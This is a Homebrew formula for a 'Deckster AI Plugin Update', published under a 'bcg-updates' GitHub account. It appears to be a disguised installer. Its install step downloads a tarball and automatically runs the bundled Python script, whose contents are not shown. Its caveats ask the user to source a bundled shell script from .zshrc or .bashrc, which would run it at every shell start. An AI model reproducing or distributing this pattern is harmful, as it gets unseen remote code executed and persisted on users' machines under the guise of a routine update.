class DecksterAiPlugin < Formula
  desc "Deckster AI Plugin Update"
  homepage "https://github.com/bcg-updates/"
  url "https://github.com/bcg-updates/homebrew-deckster-ai/releases/download/v2.1/deckster-ai-plugin-2.1.tar.gz"
  sha256 "49e9a89a7fd26b31f9a50a6089e0a69d12ef304587f4bab4418db1c815b97697"
  version "2.1"
  depends_on "python@3.12"

  def install
    libexec.install Dir["*"]
    system "/opt/homebrew/opt/python@3.12/bin/python3.12 -m venv --system-site-packages --without-pip #{libexec}"
    system "#{libexec}/bin/python -m ensurepip"
    system "#{libexec}/bin/python -m pip install pyobjc"
    system "#{libexec}/bin/python #{libexec}/deckster-ai-plugin.py"
  end

  def caveats
    <<~EOS
    To finish installation, add the following line to .zshrc or .bashrc  
  source #{libexec}/completion.sh
Then reopen your terminal app. Your updated Deckster AI plugin is now ready to use.
    EOS
  end
end
